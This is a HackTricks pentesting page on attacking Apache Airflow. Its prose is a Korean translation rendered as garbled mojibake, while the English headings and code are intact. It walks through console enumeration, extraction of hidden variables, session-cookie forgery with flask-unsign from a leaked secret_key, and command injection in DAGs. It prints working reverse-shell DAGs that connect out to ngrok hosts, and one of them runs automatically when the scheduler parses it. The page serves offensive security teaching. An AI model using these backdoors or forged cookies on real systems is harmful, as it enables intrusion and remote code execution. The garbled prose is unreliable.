# Apache Airflow Security

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

### Basic Information

[**Apache Airflow**](https://airflow.apache.org)ëŠ” **ë°ì´í„° íŒŒì´í”„ë¼ì¸ ë˜ëŠ” ì›Œí¬í”Œë¡œìš°ë¥¼ ì¡°ì •í•˜ê³  ì˜ˆì•½í•˜ëŠ” í”Œë«í¼**ìœ¼ë¡œ ì‚¬ìš©ë©ë‹ˆë‹¤. ë°ì´í„° íŒŒì´í”„ë¼ì¸ì˜ ë§¥ë½ì—ì„œ "ì¡°ì •"ì´ë¼ëŠ” ìš©ì–´ëŠ” ë‹¤ì–‘í•œ ì¶œì²˜ì—ì„œ ë°œìƒí•˜ëŠ” ë³µì¡í•œ ë°ì´í„° ì›Œí¬í”Œë¡œìš°ë¥¼ ì •ë¦¬í•˜ê³ , ì¡°ì •í•˜ë©°, ê´€ë¦¬í•˜ëŠ” ê³¼ì •ì„ ì˜ë¯¸í•©ë‹ˆë‹¤. ì´ëŸ¬í•œ ì¡°ì •ëœ ë°ì´í„° íŒŒì´í”„ë¼ì¸ì˜ ì£¼ìš” ëª©ì ì€ ì²˜ë¦¬ë˜ê³  ì†Œë¹„ ê°€ëŠ¥í•œ ë°ì´í„° ì„¸íŠ¸ë¥¼ ì œê³µí•˜ëŠ” ê²ƒì…ë‹ˆë‹¤. ì´ëŸ¬í•œ ë°ì´í„° ì„¸íŠ¸ëŠ” ë¹„ì¦ˆë‹ˆìŠ¤ ì¸í…”ë¦¬ì „ìŠ¤ ë„êµ¬, ë°ì´í„° ê³¼í•™ ë° ë¨¸ì‹  ëŸ¬ë‹ ëª¨ë¸ ë“± ë‹¤ì–‘í•œ ì• í”Œë¦¬ì¼€ì´ì…˜ì—ì„œ ê´‘ë²”ìœ„í•˜ê²Œ ì‚¬ìš©ë˜ë©°, ì´ëŠ” ë¹… ë°ì´í„° ì• í”Œë¦¬ì¼€ì´ì…˜ì˜ ê¸°ëŠ¥ì— í•„ìˆ˜ì ì…ë‹ˆë‹¤.

ê¸°ë³¸ì ìœ¼ë¡œ Apache AirflowëŠ” **ë¬´ì–¸ê°€**(ì´ë²¤íŠ¸, í¬ë¡ )ê°€ ë°œìƒí•  ë•Œ **ì½”ë“œ ì‹¤í–‰ì„ ì˜ˆì•½í•  ìˆ˜ ìˆê²Œ í•´ì¤ë‹ˆë‹¤**.

### Local Lab

#### Docker-Compose

**https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml**ì—ì„œ **docker-compose êµ¬ì„± íŒŒì¼ì„ ì‚¬ìš©í•˜ì—¬** ì™„ì „í•œ apache airflow ë„ì»¤ í™˜ê²½ì„ ì‹œì‘í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. (MacOSë¥¼ ì‚¬ìš©í•˜ëŠ” ê²½ìš° ë„ì»¤ VMì— ìµœì†Œ 6GBì˜ RAMì„ í• ë‹¹í•´ì•¼ í•©ë‹ˆë‹¤).

#### Minikube

**apache airflow**ë¥¼ ì‹¤í–‰í•˜ëŠ” ì‰¬ìš´ ë°©ë²• ì¤‘ í•˜ë‚˜ëŠ” **minikubeë¡œ ì‹¤í–‰í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤**:
```bash
helm repo add airflow-stable https://airflow-helm.github.io/charts
helm repo update
helm install airflow-release airflow-stable/airflow
# Some information about how to aceess the web console will appear after this command

# Use this command to delete it
helm delete airflow-release
```
### Airflow Configuration

AirflowëŠ” **ë¯¼ê°í•œ ì •ë³´**ë¥¼ êµ¬ì„±ì— ì €ì¥í•  ìˆ˜ ìˆìœ¼ë©°, ì•½í•œ êµ¬ì„±ì´ ìˆì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% content-ref url="airflow-configuration.md" %}
[airflow-configuration.md](airflow-configuration.md)
{% endcontent-ref %}

### Airflow RBAC

Airflowë¥¼ ê³µê²©í•˜ê¸° ì „ì— **ê¶Œí•œì´ ì–´ë–»ê²Œ ì‘ë™í•˜ëŠ”ì§€** ì´í•´í•´ì•¼ í•©ë‹ˆë‹¤:

{% content-ref url="airflow-rbac.md" %}
[airflow-rbac.md](airflow-rbac.md)
{% endcontent-ref %}

### Attacks

#### Web Console Enumeration

**ì›¹ ì½˜ì†”ì— ì ‘ê·¼í•  ìˆ˜ ìˆë‹¤ë©´** ë‹¤ìŒ ì •ë³´ ì¤‘ ì¼ë¶€ ë˜ëŠ” ì „ë¶€ì— ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

* **ë³€ìˆ˜** (ì—¬ê¸°ì— ì‚¬ìš©ì ì •ì˜ ë¯¼ê°í•œ ì •ë³´ê°€ ì €ì¥ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤)
* **ì—°ê²°** (ì—¬ê¸°ì— ì‚¬ìš©ì ì •ì˜ ë¯¼ê°í•œ ì •ë³´ê°€ ì €ì¥ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤)
* `http://<airflow>/connection/list/`ì—ì„œ ì ‘ê·¼
* [**êµ¬ì„±**](./#airflow-configuration) (ì—¬ê¸°ì— **`secret_key`** ë° ë¹„ë°€ë²ˆí˜¸ì™€ ê°™ì€ ë¯¼ê°í•œ ì •ë³´ê°€ ì €ì¥ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤)
* **ì‚¬ìš©ì ë° ì—­í• ** ëª©ë¡
* **ê° DAGì˜ ì½”ë“œ** (í¥ë¯¸ë¡œìš´ ì •ë³´ê°€ í¬í•¨ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤)

#### Retrieve Variables Values

ë³€ìˆ˜ëŠ” Airflowì— ì €ì¥ë  ìˆ˜ ìˆì–´ **DAGs**ê°€ **ê°’ì— ì ‘ê·¼**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ëŠ” ë‹¤ë¥¸ í”Œë«í¼ì˜ ë¹„ë°€ê³¼ ìœ ì‚¬í•©ë‹ˆë‹¤. **ì¶©ë¶„í•œ ê¶Œí•œ**ì´ ìˆë‹¤ë©´ `http://<airflow>/variable/list/`ì˜ GUIì—ì„œ ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
AirflowëŠ” ê¸°ë³¸ì ìœ¼ë¡œ GUIì—ì„œ ë³€ìˆ˜ì˜ ê°’ì„ í‘œì‹œí•˜ì§€ë§Œ, [**ì´**](https://marclamberti.com/blog/variables-with-apache-airflow/)ì— ë”°ë¥´ë©´ **ê°’**ì´ **ë³„í‘œ**ë¡œ í‘œì‹œë˜ëŠ” **ë³€ìˆ˜ ëª©ë¡**ì„ ì„¤ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

![](<../../.gitbook/assets/image (164).png>)

ê·¸ëŸ¬ë‚˜ ì´ëŸ¬í•œ **ê°’**ì€ ì—¬ì „íˆ **CLI**ë¥¼ í†µí•´ **ê°€ì ¸ì˜¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤** (DB ì ‘ê·¼ì´ í•„ìš”í•¨), **ì„ì˜ì˜ DAG** ì‹¤í–‰, **API**ë¥¼ í†µí•´ ë³€ìˆ˜ ì—”ë“œí¬ì¸íŠ¸ì— ì ‘ê·¼ (APIê°€ í™œì„±í™”ë˜ì–´ì•¼ í•¨), **ì‹¬ì§€ì–´ GUI ìì²´ì—ì„œë„!**\
GUIì—ì„œ ì´ëŸ¬í•œ ê°’ì— ì ‘ê·¼í•˜ë ¤ë©´ **ì ‘ê·¼í•˜ê³ ì í•˜ëŠ” ë³€ìˆ˜**ë¥¼ ì„ íƒí•˜ê³  **ì‘ì—… -> ë‚´ë³´ë‚´ê¸°**ë¥¼ í´ë¦­í•˜ë©´ ë©ë‹ˆë‹¤.\
ë˜ ë‹¤ë¥¸ ë°©ë²•ì€ **ê²€ìƒ‰ í•„í„°ë§**ì„ ì‚¬ìš©í•˜ì—¬ **ìˆ¨ê²¨ì§„ ê°’**ì— ëŒ€í•´ **ë¸Œë£¨íŠ¸í¬ìŠ¤**ë¥¼ ìˆ˜í–‰í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤:

![](<../../.gitbook/assets/image (152).png>)

#### Privilege Escalation

**`expose_config`** êµ¬ì„±ì´ **True**ë¡œ ì„¤ì •ë˜ì–´ ìˆë‹¤ë©´, **User** ì—­í•  ë° **ìƒìœ„** ì—­í• ì€ **ì›¹ì—ì„œ êµ¬ì„±**ì„ **ì½ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤**. ì´ êµ¬ì„±ì—ëŠ” **`secret_key`**ê°€ ë‚˜íƒ€ë‚˜ë©°, ì´ëŠ” ìœ íš¨í•œ ì‚¬ìš©ìê°€ **ìì‹ ì˜ ì„œëª…ëœ ì¿ í‚¤ë¥¼ ìƒì„±í•˜ì—¬ ë‹¤ë¥¸ ì‚¬ìš©ì ê³„ì •ì„ ê°€ì¥í•  ìˆ˜ ìˆìŒì„ ì˜ë¯¸í•©ë‹ˆë‹¤**.
```bash
flask-unsign --sign --secret '<secret_key>' --cookie "{'_fresh': True, '_id': '12345581593cf26619776d0a1e430c412171f4d12a58d30bef3b2dd379fc8b3715f2bd526eb00497fcad5e270370d269289b65720f5b30a39e5598dad6412345', '_permanent': True, 'csrf_token': '09dd9e7212e6874b104aad957bbf8072616b8fbc', 'dag_status_filter': 'all', 'locale': 'en', 'user_id': '1'}"
```
#### DAG ë°±ë„ì–´ (Airflow ì‘ì—…ìì—ì„œ RCE)

**DAGsê°€ ì €ì¥ëœ** ìœ„ì¹˜ì— **ì“°ê¸° ê¶Œí•œ**ì´ ìˆë‹¤ë©´, **ì—­ë°©í–¥ ì…¸**ì„ ë³´ë‚´ëŠ” **í•˜ë‚˜ë¥¼ ìƒì„±**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ì´ ì—­ë°©í–¥ ì…¸ì€ **airflow ì‘ì—…ì ì»¨í…Œì´ë„ˆ** ë‚´ì—ì„œ ì‹¤í–‰ë  ê²ƒì…ë‹ˆë‹¤:
```python
import pendulum
from airflow import DAG
from airflow.operators.bash import BashOperator

with DAG(
dag_id='rev_shell_bash',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = BashOperator(
task_id='run',
bash_command='bash -i >& /dev/tcp/8.tcp.ngrok.io/11433  0>&1',
)
```

```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
s = socket.socket()
s.connect((rhost, port))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")

with DAG(
dag_id='rev_shell_python',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = PythonOperator(
task_id='rs_python',
python_callable=rs,
op_kwargs={"rhost":"8.tcp.ngrok.io", "port": 11433}
)
```
#### DAG ë°±ë„ì–´ (Airflow ìŠ¤ì¼€ì¤„ëŸ¬ì˜ RCE)

ì½”ë“œì˜ **ë£¨íŠ¸ì—ì„œ ì‹¤í–‰ë˜ë„ë¡ ì„¤ì •**í•˜ë©´, ì´ ê¸€ì„ ì‘ì„±í•˜ëŠ” ìˆœê°„ì—, DAG í´ë”ì— ë„£ì€ í›„ ëª‡ ì´ˆ í›„ì— **ìŠ¤ì¼€ì¤„ëŸ¬ì— ì˜í•´ ì‹¤í–‰**ë©ë‹ˆë‹¤.
```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
s = socket.socket()
s.connect((rhost, port))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")

rs("2.tcp.ngrok.io", 14403)

with DAG(
dag_id='rev_shell_python2',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = PythonOperator(
task_id='rs_python2',
python_callable=rs,
op_kwargs={"rhost":"2.tcp.ngrok.io", "port": 144}
```
#### DAG ìƒì„±

ë§Œì•½ **DAG í´ëŸ¬ìŠ¤í„° ë‚´ì˜ ë¨¸ì‹ ì„ ì¹¨í•´**í•˜ëŠ” ë° ì„±ê³µí•œë‹¤ë©´, `dags/` í´ë”ì— ìƒˆë¡œìš´ **DAG ìŠ¤í¬ë¦½íŠ¸**ë¥¼ ìƒì„±í•  ìˆ˜ ìˆìœ¼ë©°, ì´ ìŠ¤í¬ë¦½íŠ¸ëŠ” **DAG í´ëŸ¬ìŠ¤í„° ë‚´ì˜ ë‚˜ë¨¸ì§€ ë¨¸ì‹ ì— ë³µì œ**ë©ë‹ˆë‹¤.

#### DAG ì½”ë“œ ì£¼ì…

GUIì—ì„œ DAGë¥¼ ì‹¤í–‰í•  ë•Œ **ì¸ìˆ˜ë¥¼ ì „ë‹¬**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ë”°ë¼ì„œ, DAGê°€ ì œëŒ€ë¡œ ì½”ë”©ë˜ì§€ ì•Šì•˜ë‹¤ë©´ **ëª…ë ¹ì–´ ì£¼ì…ì— ì·¨ì•½**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ì´ê²ƒì´ ì´ CVEì—ì„œ ë°œìƒí•œ ì¼ì…ë‹ˆë‹¤: [https://www.exploit-db.com/exploits/49927](https://www.exploit-db.com/exploits/49927)

**DAGì—ì„œ ëª…ë ¹ì–´ ì£¼ì…ì„ ì°¾ê¸° ì‹œì‘í•˜ê¸° ìœ„í•´ ì•Œì•„ì•¼ í•  ëª¨ë“  ê²ƒ**ì€ **ë§¤ê°œë³€ìˆ˜**ê°€ **ì½”ë“œ `dag_run.conf.get("param_name")`**ë¡œ **ì ‘ê·¼**ëœë‹¤ëŠ” ê²ƒì…ë‹ˆë‹¤.

ê²Œë‹¤ê°€, ê°™ì€ ì·¨ì•½ì ì´ **ë³€ìˆ˜**ì—ì„œë„ ë°œìƒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤(ì¶©ë¶„í•œ ê¶Œí•œì´ ìˆë‹¤ë©´ GUIì—ì„œ **ë³€ìˆ˜ì˜ ê°’ì„ ì œì–´**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤). ë³€ìˆ˜ëŠ” **ë‹¤ìŒê³¼ ê°™ì´ ì ‘ê·¼ë©ë‹ˆë‹¤**:
```python
from airflow.models import Variable
[...]
foo = Variable.get("foo")
```
ì˜ˆë¥¼ ë“¤ì–´ bash ëª…ë ¹ì–´ ì•ˆì—ì„œ ì‚¬ìš©ëœë‹¤ë©´, ëª…ë ¹ì–´ ì£¼ì…ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—ˆë¸Œ ë¦¬í¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŒì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}
